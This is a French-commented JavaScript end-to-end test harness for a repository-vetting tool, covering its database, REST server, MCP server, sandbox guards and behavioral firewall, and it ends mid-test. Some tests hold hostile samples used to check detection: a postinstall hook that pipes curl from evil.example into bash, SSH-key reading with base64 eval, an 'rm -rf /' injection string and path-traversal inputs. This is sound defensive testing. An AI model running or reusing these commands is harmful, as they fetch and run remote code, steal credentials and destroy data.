import assert from 'node:assert/strict';
import { readFileSync, existsSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawn } from 'node:child_process';
import { DatabaseSync } from 'node:sqlite';
import { initDatabase, closeDatabase } from '../src/db/database.mjs';
import { extractReposFromText, ingestBatchToDb } from '../src/db/bulk-ingestor.mjs';
import { calculateEloUpdate } from '../src/engines/elo-engine.mjs';
import { generatePixelRagTile } from '../src/engines/pixelrag-tile-engine.mjs';
import { generateRadarTelemetry } from '../src/engines/gods-eye-radar.mjs';
import { analyzeDigest, computeAiContextFit } from '../src/engines/gitingest-engine.mjs';
import { mapManagerToEcosystem } from '../src/engines/osv-scanner.mjs';
import { isValidRepoSlug, probeSandboxCapabilities, buildSandboxExecutionPlan } from '../src/engines/sandbox-runner.mjs';
import { classifyBusFactorRisk } from '../src/engines/maintainer-telemetry.mjs';
import { computeProfileScore, buildTournamentMarkdown } from '../src/engines/tournament-engine.mjs';
import { scanPackageJsonHooks, scanTextBehavior, summarizeBehavioralFindings, scanDirectoryBehavior } from '../src/engines/behavioral-firewall.mjs';
import {
  getCachedBehaviorOrAnalyze,
  issueIntegritySignature,
  verifyIntegritySignature,
  getHonestCensus
} from '../src/engines/integrity-registry.mjs';
import { Evidence, decide, isSignable, computeCanonicalFingerprint, evaluatePolicyAction } from '../src/engines/evidence.mjs';
import { buildTree, inclusionProof, verifyProof, leafHash, nodeHash } from '../src/engines/merkle.mjs';
import { badgeState, revokeKeyId } from '../src/engines/revocation.mjs';
import { dedupe } from '../src/engines/corpus-audit.mjs';
import { executionVerdict } from '../src/engines/recipes.mjs';
import { evaluateGolden } from './golden-eval.mjs';
import { extractDeps, computeCensus, evaluateIdentity } from '../scripts/scan-corpus.mjs';
import { assessCoverage, gateCompleteness, applyCap, visibleAdvisories, assessRepo, decomposeReasons, checkBand } from '../src/engines/completeness.mjs';
import { cleanGitUrl, expectedUpstream, identityVerdict, buildIdentityScope } from '../src/engines/identity-anchor.mjs';
import { locateLockfiles, readLocks, blockCause, scopeStatement, ECO_LOCKS } from '../src/engines/probe-depth.mjs';
import { runPrGuard } from '../src/engines/pr-guard.mjs';
import { issueOrgLicense, verifyOrgLicense } from '../src/engines/license-tier.mjs';
import { createGitArenaServer } from '../src/server/server.mjs';
import { SovereignAutomationEngine } from '../src/workflows/workflow-engine.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

async function runE2eHarness() {
  console.log('\n======================================================');
  console.log('🛡️  HARNAIS DE VÉRIFICATION E2E GITARENA / REPOVERIFY');
  console.log('Doctrine G0D-PRÆTOR & Harness Engineering (Exit Code 0)');
  console.log('======================================================\n');

  let passedTests = 0;
  const totalTests = 29;

  // TEST-01 : Schéma & Persistance SQLite WAL
  console.log('[TEST-01] Vérification du Schéma & Mode WAL SQLite...');
  const db = initDatabase();
  const pragmaWal = db.prepare('PRAGMA journal_mode;').get();
  assert.equal(pragmaWal.journal_mode.toLowerCase(), 'wal', 'Le mode WAL doit être actif');

  const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all().map(t => t.name);
  for (const requiredTable of [
    'repositories', 'repositories_fts', 'arena_duels', 'harness_runs',
    'gitingest_cache', 'ci_telemetry_cache', 'osv_vuln_cache', 'workflow_audit_log',
    'maintainer_health_cache', 'arena_tournaments',
    'behavioral_audits', 'behavioral_facts', 'integrity_signatures', 'revoked_keys',
    'execution_benchmarks', 'org_policies',
    'corpus_inputs', 'repos', 'manifest_cache', 'osv_queries', 'scan_runs',
    'cohort_members', 'stage_attrition', 'probe_outcomes'
  ]) {
    assert.ok(tables.includes(requiredTable), `Table ${requiredTable} absente`);
  }
  console.log('  ✓ TEST-01 Validé : SQLite WAL et 24 tables opérationnels.');
  passedTests++;

  // TEST-02 : Ingestion & Seeding Réel
  console.log('[TEST-02] Vérification du Seeding Réel...');
  const repoCount = db.prepare('SELECT COUNT(*) as cnt FROM repositories').get().cnt;
  assert.ok(repoCount >= 200, `Au moins 200 dépôts doivent être indexés (actuel: ${repoCount})`);

  const sampleRepo = db.prepare('SELECT * FROM repositories WHERE full_name = ?').get('huggingface/transformers');
  assert.ok(sampleRepo, 'huggingface/transformers doit être présent');
  assert.ok(sampleRepo.ai_potential_score > 90, 'Score IA Transformers doit être > 90');
  assert.ok(db.prepare('SELECT * FROM repositories WHERE full_name = ?').get('vercel/next.js'), 'vercel/next.js doit être présent');
  assert.ok(db.prepare('SELECT * FROM repositories WHERE full_name = ?').get('ggml-org/llama.cpp'), 'ggml-org/llama.cpp doit être présent');
  console.log(`  ✓ TEST-02 Validé : ${repoCount} dépôts indexés en base.`);
  passedTests++;

  // TEST-03 : Recherche Plein-Texte FTS5 Sub-Milliseconde
  console.log('[TEST-03] Vérification de la Vitesse & Précision FTS5...');
  const t0 = performance.now();
  const ftsResults = db.prepare(`
    SELECT repositories.full_name, repositories.ai_potential_score
    FROM repositories_fts
    JOIN repositories ON repositories.id = repositories_fts.rowid
    WHERE repositories_fts MATCH '"transformers"*'
  `).all();
  const queryDuration = performance.now() - t0;
  assert.ok(ftsResults.length > 0, 'Recherche FTS5 doit renvoyer transformers');
  assert.ok(queryDuration < 20, `Temps de recherche sub-20ms requis (mesuré: ${queryDuration.toFixed(2)} ms)`);
  console.log(`  ✓ TEST-03 Validé : Recherche FTS5 exécutée en ${queryDuration.toFixed(2)} ms.`);
  passedTests++;

  // TEST-04 : Moteur ELO & Invariants Mathématiques
  console.log('[TEST-04] Vérification Mathématique du Moteur ELO...');
  const eloOutcome = calculateEloUpdate(1600, 1600, 1.0, 32);
  assert.equal(eloOutcome.newRatingA, 1616, 'Challenger A doit gagner 16 points');
  assert.equal(eloOutcome.newRatingB, 1584, 'Challenger B doit perdre 16 points');
  assert.equal(eloOutcome.deltaA + eloOutcome.deltaB, 0, 'Conservation stricte de la somme des points requise');
  console.log('  ✓ TEST-04 Validé : Symétrie ELO et conservation mathématique prouvées.');
  passedTests++;

  // TEST-05 : Moteur PixelRAG Visual Tile
  console.log('[TEST-05] Vérification du Moteur PixelRAG Visual Tile...');
  const tileResult = generatePixelRagTile(sampleRepo);
  assert.ok(tileResult.tileSvg.includes('<svg'), 'Doit générer du SVG valide');
  assert.ok(tileResult.tileSvg.includes('huggingface/transformers'), 'Doit inclure le nom du dépôt');
  assert.equal(tileResult.tileHash.length, 64, 'Condensat SHA-256 de tuile doit être 64 caractères hex');
  console.log('  ✓ TEST-05 Validé : Tuile PixelRAG synthétisée avec empreinte SHA-256 scellée.');
  passedTests++;

  // TEST-06 : Radar Tactique Sovereign God's Eye
  console.log('[TEST-06] Vérification du Radar Tactique Sovereign God\'s Eye...');
  const topRepos = db.prepare('SELECT * FROM repositories LIMIT 50').all();
  const telemetry = generateRadarTelemetry(topRepos);
  assert.equal(telemetry.totalTargets, 50, 'Doit cartographier 50 nœuds');
  assert.equal(telemetry.integritySeal.length, 64, 'Empreinte de surveillance requise');
  assert.ok(telemetry.nodes[0].coords.x !== undefined, 'Coordonnées X tactiques requises');
  console.log('  ✓ TEST-06 Validé : Télémétrie radar spatial conforme.');
  passedTests++;

  // TEST-07 : Autonomous Workflow Engine + Journalisation SQLite
  console.log('[TEST-07] Vérification du Moteur de Workflows & Journalisation...');
  const workflowEngine = new SovereignAutomationEngine();
  workflowEngine.initDefaultWorkflows();
  const auditResult = await workflowEngine.runWorkflow('wf-integrity-audit');
  assert.equal(auditResult.status, 'SUCCESS', 'Le workflow doit réussir');
  assert.equal(auditResult.seal.length, 64, 'Sceau cryptographique du workflow requis');
  const loggedRow = db.prepare('SELECT * FROM workflow_audit_log WHERE id = ?').get(auditResult.id);
  assert.ok(loggedRow, 'Exécution workflow persistée dans workflow_audit_log');
  console.log('  ✓ TEST-07 Validé : Boucle TCA exécutée, scellée et journalisée.');
  passedTests++;

  // TEST-08 : Extraction Manifestes Multi-Langages (Rust, Go, Node) + OSV Ecosystem + AI-Context Fit
  console.log('[TEST-08] Vérification Extraction Cargo/Go/Node & AI-Context Fit...');
  const rustDigest = analyzeDigest({
    summary: 'Files analyzed: 42\nEstimated tokens: 28.5k\nCommit: abc12345',
    tree: 'README.md\nCargo.toml\nCargo.lock\nsrc/main.rs\ntests/integration.rs\n.github/workflows/ci.yml',
    content: 'FILE: Cargo.toml\n================================================\n[package]\nname = "demo"\nedition = "2021"\nrust-version = "1.78"\n[dependencies]\ntokio = "1.40"\nserde = "1.0"\n'
  });
  assert.equal(rustDigest.dependencies.manager, 'cargo');
  assert.ok(rustDigest.dependencies.runtime.includes('tokio'), 'Doit extraire tokio depuis Cargo.toml');
  assert.equal(rustDigest.runtimeConstraint, 'Rust >= 1.78');
  assert.ok(rustDigest.projectHealth.hasLockfile, 'Doit détecter Cargo.lock');
  assert.equal(mapManagerToEcosystem('cargo'), 'crates.io');

  const goDigest = analyzeDigest({
    summary: 'Files analyzed: 18\nEstimated tokens: 12k',
    tree: 'go.mod\ngo.sum\nmain.go',
    content: 'FILE: go.mod\n================================================\nmodule example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.1\n)\n'
  });
  assert.equal(goDigest.dependencies.manager, 'go modules');
  assert.ok(goDigest.dependencies.runtime.includes('github.com/gin-gonic/gin'), 'Doit extraire module go.mod');
  assert.equal(goDigest.runtimeConstraint, 'Go >= 1.22');
  assert.equal(computeAiContextFit(50000).fitsIn128k, true);
  console.log('  ✓ TEST-08 Validé : Extraction Cargo/Go/Lockfiles & AI-Context Fit conformes.');
  passedTests++;

  // TEST-09 : Serveur HTTP & Tous Endpoints REST (Inspection, Arène, Radar, Filtres, Export)
  console.log('[TEST-09] Vérification du Serveur HTTP & Endpoints REST complets...');
  const server = createGitArenaServer();
  const testPort = 8999;

  await new Promise(resolve => server.listen(testPort, '127.0.0.1', resolve));

  try {
    const resRepos = await fetch(`http://127.0.0.1:${testPort}/api/repos?limit=5&license=permissive`);
    assert.equal(resRepos.status, 200);
    const dataRepos = await resRepos.json();
    assert.equal(dataRepos.items.length, 5);

    const resFilters = await fetch(`http://127.0.0.1:${testPort}/api/filters`);
    assert.equal(resFilters.status, 200);
    const filtersData = await resFilters.json();
    assert.ok(filtersData.languages.length > 0 && filtersData.categories.length > 0);

    const resBadge = await fetch(`http://127.0.0.1:${testPort}/api/badge/huggingface/transformers`);
    assert.equal(resBadge.status, 200);
    assert.ok((await resBadge.text()).includes('<svg'));

    const resInspect = await fetch(`http://127.0.0.1:${testPort}/api/inspect/huggingface/transformers`);
    assert.equal(resInspect.status, 200);
    const inspectData = await resInspect.json();
    assert.equal(inspectData.repository.full_name, 'huggingface/transformers');
    assert.equal(inspectData.health.environment.exitCode, 0);
    assert.ok(inspectData.legalAndSecurity.commercialSafe);
    assert.equal(inspectData.pixelRagArchitecture.tileHash.length, 64);

    // Vérifier que harness_runs a bien enregistré l'inspection
    const harnessRow = db.prepare('SELECT * FROM harness_runs WHERE id = ?').get(inspectData.health.harnessRun.runId);
    assert.ok(harnessRow, 'harness_runs doit persister le run');

    // Export Markdown Due-Diligence
    const resExport = await fetch(`http://127.0.0.1:${testPort}/api/inspect/huggingface/transformers/export?format=md`);
    assert.equal(resExport.status, 200);
    const mdText = await resExport.text();
    assert.ok(mdText.includes('Rapport de Due-Diligence Open-Source'), 'Export Markdown valide');

    // Arène Duel + Vote réel (avec restauration des ELO ensuite pour ne pas polluer le seed)
    const resDuel = await fetch(`http://127.0.0.1:${testPort}/api/arena/duel?a=huggingface/transformers&b=langchain-ai/langchain`);
    assert.equal(resDuel.status, 200);
    const duelData = await resDuel.json();
    assert.ok(duelData.repoA && duelData.repoB);

    const resVote = await fetch(`http://127.0.0.1:${testPort}/api/arena/vote`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ repoAId: duelData.repoA.id, repoBId: duelData.repoB.id, winner: 'A' })
    });
    assert.equal(resVote.status, 200);
    const voteData = await resVote.json();
    assert.equal(voteData.ok, true);
    assert.equal(voteData.repoA.delta + voteData.repoB.delta, 0);

    // Radar God's Eye
    const resRadar = await fetch(`http://127.0.0.1:${testPort}/api/radar?limit=25`);
    assert.equal(resRadar.status, 200);
    const radarData = await resRadar.json();
    assert.equal(radarData.totalTargets, 25);

    // Workflows Status
    const resWf = await fetch(`http://127.0.0.1:${testPort}/api/workflows/status`);
    assert.equal(resWf.status, 200);

    // Sandbox Capabilities & Sécurité Path Traversal (Red-Team check)
    const resCaps = await fetch(`http://127.0.0.1:${testPort}/api/sandbox/capabilities`);
    assert.equal(resCaps.status, 200);
    const capsData = await resCaps.json();
    assert.equal(typeof capsData.gitAvailable, 'boolean');

    const resTraversal = await fetch(`http://127.0.0.1:${testPort}/..%2f..%2fpackage.json`);
    assert.equal(resTraversal.status, 403, 'Path Traversal doit retourner 403 Forbidden');

    // Tournoi Multi-Dépôts (6 candidats) + Export Markdown Shortlist
    const resTourney = await fetch(`http://127.0.0.1:${testPort}/api/arena/tournament`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        profile: 'enterprise',
        includeLiveChecks: false,
        repos: [
          'langchain-ai/langgraph',
          'crewAIInc/crewAI',
          'microsoft/autogen',
          'unclecode/crawl4ai',
          'mendableai/firecrawl',
          'All-Hands-AI/OpenHands'
        ]
      })
    });
    assert.equal(resTourney.status, 200);
    const tourneyData = await resTourney.json();
    assert.equal(tourneyData.candidatesCount, 6);
    assert.equal(tourneyData.stages.length, 3);
    assert.ok(tourneyData.champion && tourneyData.podium.length === 3);
    // Vérifier que mendableai/firecrawl (AGPL-3.0) est éliminé à l'étape 1 en profil enterprise
    const firecrawlRow = tourneyData.ranking.find(c => c.fullName === 'mendableai/firecrawl');
    assert.equal(firecrawlRow.eliminatedAtStage, 1, 'AGPL-3.0 doit être éliminé à l\'étape 1 en profil enterprise');

    const resTourneyExport = await fetch(`http://127.0.0.1:${testPort}/api/arena/tournament/${tourneyData.tournamentId}/export?format=md`);
    assert.equal(resTourneyExport.status, 200);
    assert.ok((await resTourneyExport.text()).includes('Matrice Comparative Multi-Dépôts'));

    // Pilier 2 HTTP : Extinction par défaut (503) + Integrity Registry Verify (opt-in isolé)
    const prevExpose = process.env.REPOVERIFY_EXPOSE_VERDICTS;
    delete process.env.REPOVERIFY_EXPOSE_VERDICTS;
    const resClosed = await fetch(`http://127.0.0.1:${testPort}/api/integrity/sign`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ repo: 'huggingface/transformers' })
    });
    assert.equal(resClosed.status, 503, 'La surface d\'émission de verdicts doit retourner 503 par défaut');

    try {
      process.env.REPOVERIFY_EXPOSE_VERDICTS = 'true';
      const resSignIndet = await fetch(`http://127.0.0.1:${testPort}/api/integrity/sign`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ repo: 'huggingface/transformers', policyProfile: 'enterprise', includeLiveCi: false })
      });
      assert.equal(resSignIndet.status, 200);
      const sigIndet = await resSignIndet.json();
      assert.notEqual(sigIndet.decision, 'ALLOW', 'Sans preuves en cache, le moteur fail-closed ne doit jamais retourner ALLOW');
      assert.ok(sigIndet.signatureEd25519 && sigIndet.payloadSha256.length === 64);

      const resSignDeny = await fetch(`http://127.0.0.1:${testPort}/api/integrity/sign`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ repo: 'mendableai/firecrawl', policyProfile: 'enterprise', includeLiveCi: false })
      });
      assert.equal(resSignDeny.status, 200);
      const sigDeny = await resSignDeny.json();
      assert.equal(sigDeny.decision, 'DENY', 'AGPL-3.0 doit être DENY en politique enterprise');

      const resVerifyGood = await fetch(`http://127.0.0.1:${testPort}/api/integrity/verify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sigIndet)
      });
      assert.equal((await resVerifyGood.json()).valid, true);

      const resVerifyTampered = await fetch(`http://127.0.0.1:${testPort}/api/integrity/verify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...sigIndet, payloadJson: sigIndet.payloadJson.replace('INDETERMINATE', 'ALLOW') })
      });
      assert.equal((await resVerifyTampered.json()).valid, false, 'Une signature altérée doit être rejetée');

      const dbClean = initDatabase();
      dbClean.prepare('DELETE FROM integrity_signatures WHERE id IN (?, ?)').run(sigIndet.id, sigDeny.id);
    } finally {
      if (prevExpose === undefined) delete process.env.REPOVERIFY_EXPOSE_VERDICTS;
      else process.env.REPOVERIFY_EXPOSE_VERDICTS = prevExpose;
    }

    const resStats = await fetch(`http://127.0.0.1:${testPort}/api/stats`);
    assert.equal(resStats.status, 200);
    const statsJson = await resStats.json();
    assert.ok(statsJson.verifiedWithEvidenceCount <= statsJson.indexedCount, '/api/stats : vérifiés <= indexés obligatoire');

    // Pilier 3 HTTP : Execution Benchmarks
    const resBenchRun = await fetch(`http://127.0.0.1:${testPort}/api/benchmarks/execution/run`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ repo: 'huggingface/transformers' })
    });
    assert.equal(resBenchRun.status, 200);
    const benchRunData = await resBenchRun.json();
    assert.equal(benchRunData.ok, true);
    assert.ok(benchRunData.benchmark.throughputOps > 0);

    // Pilier 4 HTTP : Open-Core License Issue & Verification Header
    const resLicIssue = await fetch(`http://127.0.0.1:${testPort}/api/license/issue`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ orgId: 'test-org-e2e', tier: 'pro' })
    });
    assert.equal(resLicIssue.status, 200);
    const licIssued = await resLicIssue.json();
    assert.ok(licIssued.token.startsWith('rv1.'));

    const resLicStatus = await fetch(`http://127.0.0.1:${testPort}/api/license/status`, {
      headers: { 'X-RepoVerify-Key': licIssued.token }
    });
    assert.equal(resLicStatus.status, 200);
    const licStatus = await resLicStatus.json();
    assert.equal(licStatus.activeTier, 'pro');
    assert.equal(licStatus.orgId, 'test-org-e2e');

    console.log('  ✓ TEST-09 Validé : Endpoints REST, Extinction 503, Integrity Ed25519, Benchmarks & Path Traversal.');
    passedTests++;
  } finally {
    server.closeAllConnections?.();
    server.unref();
    await new Promise(resolve => server.close(resolve));
    closeDatabase();
  }

  // TEST-10 : Serveur MCP Souverain sur stdio (JSON-RPC 2.0 — gatekeep_install retiré par défaut)
  console.log('[TEST-10] Vérification du Serveur MCP Souverain (stdio JSON-RPC 2.0)...');
  await new Promise((resolve, reject) => {
    const envClean = { ...process.env };
    delete envClean.REPOVERIFY_EXPOSE_VERDICTS;
    const mcpProc = spawn(process.execPath, [join(__dirname, '../src/mcp/mcp-server.mjs')], {
      stdio: ['pipe', 'pipe', 'pipe'],
      env: envClean
    });
    const responses = [];
    let buffer = '';

    mcpProc.stdout.on('data', (chunk) => {
      buffer += chunk.toString();
      const lines = buffer.split('\n');
      buffer = lines.pop();
      for (const line of lines) {
        if (line.trim()) responses.push(JSON.parse(line));
      }
      if (responses.length >= 4) {
        mcpProc.stdin.end();
      }
    });

    mcpProc.on('error', reject);
    mcpProc.on('close', (code) => {
      try {
        assert.equal(code, 0, 'MCP server doit quitter proprement avec code 0');
        assert.equal(responses[0].result.serverInfo.name, 'repoverify-gitarena');
        assert.equal(responses[1].result.tools.length, 5, 'gatekeep_install doit être retiré de tools/list');
        assert.equal(responses[1].result.tools.some(t => t.name === 'gatekeep_install'), false);
        const searchPayload = JSON.parse(responses[2].result.content[0].text);
        assert.ok(searchPayload.items.length > 0, 'search_repos MCP doit retourner des résultats');
        assert.equal(responses[3].result.isError, true, 'Appel explicite à gatekeep_install doit retourner isError: true');
        resolve();
      } catch (e) {
        reject(e);
      }
    });

    mcpProc.stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: {} }) + '\n');
    mcpProc.stdin.write(JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/list', params: {} }) + '\n');
    mcpProc.stdin.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: { name: 'search_repos', arguments: { q: 'transformers', limit: 3 } }
    }) + '\n');
    mcpProc.stdin.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: { name: 'gatekeep_install', arguments: { repo: 'huggingface/transformers' } }
    }) + '\n');
  });
  console.log('  ✓ TEST-10 Validé : Serveur MCP stdio opérationnel (5 outils, gatekeep_install fermé par défaut).');
  passedTests++;

  // TEST-11 : Pipeline Bulk Ingestor Hyperscale (Test 10 000 dépôts sur base WAL temporaire)
  console.log('[TEST-11] Vérification du Pipeline Bulk Ingestor (10k batch + FTS5 sur base temporaire)...');
  const packParsed = extractReposFromText(readFileSync(join(__dirname, '../pack_10000_depots_github_ssh/top_depots_ssh_urls.txt'), 'utf8'));
  assert.equal(packParsed.length, 20, 'Doit parser les 20 dépôts SSH du top pack');

  const benchDir = mkdtempSync(join(tmpdir(), 'gitarena-bench-'));
  const benchDbPath = join(benchDir, 'bench10k.sqlite');
  try {
    const benchDb = new DatabaseSync(benchDbPath);
    benchDb.exec(readFileSync(join(__dirname, '../src/db/schema.sql'), 'utf8'));
    const batch10k = Array.from({ length: 10000 }, (_, i) => ({
      full_name: `org-${i % 100}/repo-${i}`,
      owner: `org-${i % 100}`,
      name: `repo-${i}`,
      ssh_url: `git@github.com:org-${i % 100}/repo-${i}.git`,
      stars: 1000 + (i % 50000),
      forks: 100 + (i % 5000),
      language: i % 2 === 0 ? 'Python' : 'Rust',
      license: 'MIT',
      ai_potential_score: 75.5,
      elo_rating: 1550,
      pushed_at: '2026-10-01T00:00:00.000Z',
      description: `High performance hyperscale benchmark package #${i}`,
      category: 'Benchmark'
    }));
    const ingestStats = ingestBatchToDb(benchDb, batch10k);
    assert.equal(ingestStats.count, 10000);

    const tFts = performance.now();
    const benchHits = benchDb.prepare(`
      SELECT repositories.full_name FROM repositories_fts
      JOIN repositories ON repositories.id = repositories_fts.rowid
      WHERE repositories_fts MATCH '"hyperscale"*' LIMIT 10
    `).all();
    const fts10kMs = Math.round((performance.now() - tFts) * 100) / 100;
    assert.equal(benchHits.length, 10);
    assert.ok(fts10kMs < 50, `FTS5 sur 10k doit rester < 50ms (mesuré: ${fts10kMs}ms)`);
    benchDb.close();
    console.log(`  ✓ TEST-11 Validé : 10 000 dépôts ingérés en ${ingestStats.durationMs} ms, FTS5 en ${fts10kMs} ms.`);
    passedTests++;
  } finally {
    rmSync(benchDir, { recursive: true, force: true });
  }

  // TEST-12 : Sandbox Runner & Garde-fous Anti-Injection
  console.log('[TEST-12] Vérification du Sandbox Runner & Garde-fous...');
  assert.equal(isValidRepoSlug('huggingface/transformers'), true);
  assert.equal(isValidRepoSlug('../etc/passwd'), false);
  assert.equal(isValidRepoSlug('owner/repo; rm -rf /'), false);
  const hostCaps = probeSandboxCapabilities();
  assert.equal(typeof hostCaps.gitAvailable, 'boolean');
  assert.equal(typeof hostCaps.dockerAvailable, 'boolean');
  const nodePlan = buildSandboxExecutionPlan(join(__dirname, '..'), 'JavaScript');
  assert.equal(nodePlan.ecosystem, 'node');
  assert.equal(nodePlan.image, 'node:22-alpine');
  console.log(`  ✓ TEST-12 Validé : Sandbox guardrails OK (git=${hostCaps.gitAvailable}, docker=${hostCaps.dockerAvailable}).`);
  passedTests++;

  // TEST-13 : Bus Factor & Profils de Scoring Métier
  console.log('[TEST-13] Vérification Bus Factor & Profils Pondérés...');
  assert.equal(classifyBusFactorRisk(1, 100), 'HIGH');
  assert.equal(classifyBusFactorRisk(2, 90), 'HIGH');
  assert.equal(classifyBusFactorRisk(10, 35), 'LOW');

  const safeCandidate = { aiScore: 85, elo: 1650, commercialSafe: true, daysSincePush: 5, ciStatus: 'SUCCESS', cveCount: 0, cveMaxSeverity: 'NONE', busFactorRisk: 'LOW', hasLockfile: true, hasDocsDir: true, estimatedTokens: 120000 };
  const riskyCandidate = { aiScore: 88, elo: 1660, commercialSafe: false, daysSincePush: 5, ciStatus: 'FAILURE', cveCount: 2, cveMaxSeverity: 'CRITICAL', busFactorRisk: 'HIGH', hasLockfile: false, hasDocsDir: true, estimatedTokens: 120000 };
  const entSafe = computeProfileScore(safeCandidate, 'enterprise').profileScore;
  const entRisky = computeProfileScore(riskyCandidate, 'enterprise').profileScore;
  assert.ok(entSafe > entRisky + 30, `Profil entreprise doit fortement préférer le projet sûr (${entSafe} vs ${entRisky})`);
  console.log(`  ✓ TEST-13 Validé : Bus Factor & Profils métier conformes (Safe=${entSafe}, Risky=${entRisky}).`);
  passedTests++;

  // TEST-14 : Pilier 1 — Behavioral Firewall (Détection Postinstall, SSH/AWS, Obfuscation)
  console.log('[TEST-14] Vérification du Behavioral Firewall (Pilier 1)...');
  const maliciousPkg = JSON.stringify({ name: 'evil-pkg', scripts: { postinstall: 'curl https://evil.example/p.sh | bash' } });
  const hookFindings = scanPackageJsonHooks(maliciousPkg);
  assert.equal(hookFindings[0].severity, 'CRITICAL');
  const sshFindings = scanTextBehavior("const k = fs.readFileSync('~/.ssh/id_rsa'); eval(Buffer.from('YQ==','base64').toString());", 'bad.js');
  const summaryMal = summarizeBehavioralFindings([...hookFindings, ...sshFindings], 'STATIC');
  assert.equal(summaryMal.verdict, 'DENY');
  assert.ok(summaryMal.riskScore >= 60);
  const selfScan = scanDirectoryBehavior(join(__dirname, '..', 'src'));
  assert.notEqual(selfScan.verdict, 'DENY', 'Le code propre du projet ne doit pas être bloqué');
  assert.notEqual(selfScan.verdict, 'STATIC_CLEAN', 'verdict doit être issu de decide() (INDETERMINATE/ALLOW/WARN/DENY)');
  console.log(`  ✓ TEST-14 Validé : Behavioral Firewall bloque les vecteurs malveillants (Risk=${summaryMal.riskScore}/100).`);
  passedTests++;

  // TEST-15 : Pilier 2 — PR Guard CI sur dépôt local (offline)
  console.log('[TEST-15] Vérification du PR Guard CI (Pilier 2)...');
  const prGuardRes = await runPrGuard(join(__dirname, '..'), { offline: true, profile: 'enterprise' });
  assert.equal(prGuardRes.passed, true, 'PR Guard doit passer sur RepoVerify lui-même');
  assert.equal(prGuardRes.exitCode, 0);
  assert.equal(prGuardRes.commercialSafe, true);
  console.log('  ✓ TEST-15 Validé : PR Guard CI retourne Exit Code 0 sur le projet.');
  passedTests++;

  // TEST-16 : Pilier 3 — Vérification directe Empreinte Matérielle & Benchmarks
  console.log('[TEST-16] Vérification des Benchmarks d\'Exécution (Pilier 3)...');
  const dbCheck = initDatabase();
  const benchCount = dbCheck.prepare('SELECT COUNT(*) as cnt FROM execution_benchmarks').get().cnt;
  assert.ok(benchCount >= 1, 'Au moins 1 benchmark chronométré doit être persisté');
  closeDatabase();
  console.log(`  ✓ TEST-16 Validé : ${benchCount} benchmark(s) d'exécution persisté(s).`);
  passedTests++;

  // TEST-17 : Pilier 4 — Licences Ed25519 Open-Core Hors-Ligne
  console.log('[TEST-17] Vérification des Licences Ed25519 Open-Core (Pilier 4)...');
  const lic = issueOrgLicense({ orgId: 'unit-enterprise', tier: 'enterprise', validDays: 30 });
  const licCheck = verifyOrgLicense(lic.token);
  assert.equal(licCheck.valid, true);
  assert.equal(licCheck.tier, 'enterprise');
  const tamperedLic = verifyOrgLicense(lic.token + 'x');
  assert.equal(tamperedLic.valid, false, 'Une licence altérée doit être rejetée');
  console.log('  ✓ TEST-17 Validé : Licences Ed25519 Open-Core signées & vérifiées hors-ligne.');
  passedTests++;

  // TEST-18 : Vérification Hors-Ligne Signature Ed25519 (Contrat Fail-Closed)
  console.log('[TEST-18] Vérification du Contrat de Signature d\'Intégrité...');
  assert.equal(verifyIntegritySignature({ payloadJson: '{}', signatureEd25519: 'bad', publicKeyPem: 'bad' }).valid, false);
  console.log('  ✓ TEST-18 Validé : Contrat de vérification Ed25519 fail-closed.');
  passedTests++;

  // TEST-19 : Scanner Anti-Simulation (Zero Mock / Zero TODO)
  console.log('[TEST-19] Exécution du Scanner Anti-Simulation...');
  const filesToCheck = [
    'src/config/flags.mjs',
    'src/db/database.mjs',
    'src/db/seeder.mjs',
    'src/db/bulk-ingestor.mjs',
    'src/engines/evidence.mjs',
    'src/engines/completeness.mjs',
    'src/engines/identity-anchor.mjs',
    'src/engines/probe-depth.mjs',
    'src/engines/ai-scoring-engine.mjs',
    'src/engines/elo-engine.mjs',
    'src/engines/harness-runner.mjs',
    'src/engines/pixelrag-tile-engine.mjs',
    'src/engines/gods-eye-radar.mjs',
    'src/engines/gitingest-engine.mjs',
    'src/engines/osv-scanner.mjs',
    'src/engines/ci-telemetry.mjs',
    'src/engines/maintainer-telemetry.mjs',
    'src/engines/behavioral-firewall.mjs',
    'src/engines/integrity-registry.mjs',
    'src/engines/merkle.mjs',
    'src/engines/revocation.mjs',
    'src/engines/corpus-audit.mjs',
    'src/engines/recipes.mjs',
    'src/engines/pr-guard.mjs',
    'src/engines/benchmark-runner.mjs',
    'src/engines/license-tier.mjs',
    'src/engines/sandbox-runner.mjs',
    'src/engines/tournament-engine.mjs',
    'src/engines/repo-service.mjs',
    'src/workflows/workflow-engine.mjs',
    'src/server/router.mjs',
    'src/server/controllers.mjs',
    'src/server/server.mjs',
    'src/mcp/mcp-server.mjs',
    'src/studio/video-studio.mjs',
    'src/studio/benchmark-publisher.mjs',
    'src/studio/gif-encoder.mjs',
    'scripts/scan-corpus.mjs',
    'tests/golden-eval.mjs'
  ];

  for (const file of filesToCheck) {
    const fullPath = join(__dirname, '..', file);
    assert.ok(existsSync(fullPath), `Fichier attendu absent : ${file}`);
    const code = readFileSync(fullPath, 'utf8');
    assert.ok(!code.includes('// TODO'), `Marqueur interdit // TODO trouvé dans ${file}`);
